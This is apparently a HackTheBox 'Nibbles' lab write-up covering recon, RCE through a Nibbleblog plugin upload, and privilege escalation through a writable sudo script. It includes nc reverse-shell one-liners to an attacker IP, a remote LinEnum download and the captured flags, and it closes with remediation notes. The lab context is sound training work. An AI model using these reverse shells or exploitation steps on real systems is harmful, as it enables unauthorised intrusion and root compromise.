# Target: Nibbles (HTB)

## Target

- **IP:** `10.129.116.32`

## Recon & Enumeration

Commands executed:

```bash
nmap -sV --open -oA nibbles_initial_scan 10.129.116.32
nmap -p- --open -oA nibbles_full_tcp_scan 10.129.116.32
nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.116.32
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.116.32
nc -nv 10.129.116.32 22
nc -nv 10.129.116.32 80
whatweb 10.129.116.32
```

Key results:

- **22/tcp (ssh):** OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
- **80/tcp (http):** Apache 2.4.18 (Ubuntu)

## Web Discovery

- Base page hinted at application path:

```html
<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

- Fingerprinting:

```bash
whatweb http://10.129.116.32/nibbleblog
```

- Directory enumeration:

```bash
gobuster dir -u http://10.129.116.32/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

Notable findings:

- `/nibbleblog/README` indicated **Nibbleblog v4.0.3**
- Mirrored site content locally:

```bash
wget -m http://10.129.116.32/nibbleblog/
```

- Observed directory listing in browser; found:
  - `/nibbleblog/content/private/users.xml`

## Initial Access (Web RCE)

### Credentials

- Determined admin credentials were:
  - **`admin:nibbles`**

### RCE via plugin upload

- Via admin panel, identified **My Image** plugin.
- Uploaded a test PHP file to validate code execution.

Validation command:

```bash
curl http://10.129.116.32/nibbleblog/content/private/plugins/my_image/image.php
```

Result:

```text
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

### Reverse shell

You uploaded a PHP reverse shell:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.237 9443 >/tmp/f"); ?>
```

Stabilized shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Proof of Access

- User flag located and read from:
  - `/home/nibbler/user.txt`

Captured value:

```text
79c03865431abf47b90ef24b9695e148
```

## Privilege Escalation

### Discovery

- Extracted `personal.zip` and found `monitor.sh`.
- Ran LinEnum:

```bash
sudo python3 -m http.server 8080
wget http://10.10.14.237:8080/LinEnum.sh
```

Result (as captured):

- User can run the monitor script as root without password.

### Exploit

- Appended a root reverse shell to `monitor.sh`:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.237 8443 >/tmp/f' | tee -a monitor.sh
```

- Started listener:

```bash
nc -lvnp 8443
```

- Executed allowed command:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

## Proof of Privilege Escalation

- Root flag retrieved from `/root/root.txt`:

```text
de5e5d6619862a8aa5b9b212314e0cdd
```

## Critique / Missing Detail (recommended additions)

- **How `admin:nibbles` was found**: the log states the creds but doesn’t show the discovery method (e.g., read from a file, guessed, brute-forced, or reused). Add:
  - the exact source (URL/file) or the exact brute-force command (e.g., Hydra) and wordlist.
- **Upload path & constraints**: add the exact upload location, allowed extensions, and any bypass used (if applicable).
- **Listener evidence**: include the `nc` output showing the inbound connection, plus `whoami`, `id`, `hostname`.
- **LinEnum output**: include the relevant `sudo -l` output (or LinEnum excerpt) showing the exact sudo rule.
- **Why privesc worked**: explicitly state that `monitor.sh` was **writable** by the low-priv user and executed as root via sudo.

## Remediation Notes (high-level)

- Patch/upgrade Nibbleblog; restrict access to `/content/private/`.
- Disable directory listing.
- Restrict file uploads; disallow PHP execution in upload/plugin directories.
- Remove passwordless sudo for scripts, or enforce root-owned + immutable scripts with safe paths.

---

## Optional Submission Hygiene

- If your course submission is shared, consider redacting:
  - API keys (e.g., the GetSimple `apikey`)
  - internal callback IPs/ports
  - any sensitive file contents beyond required proof (flags)
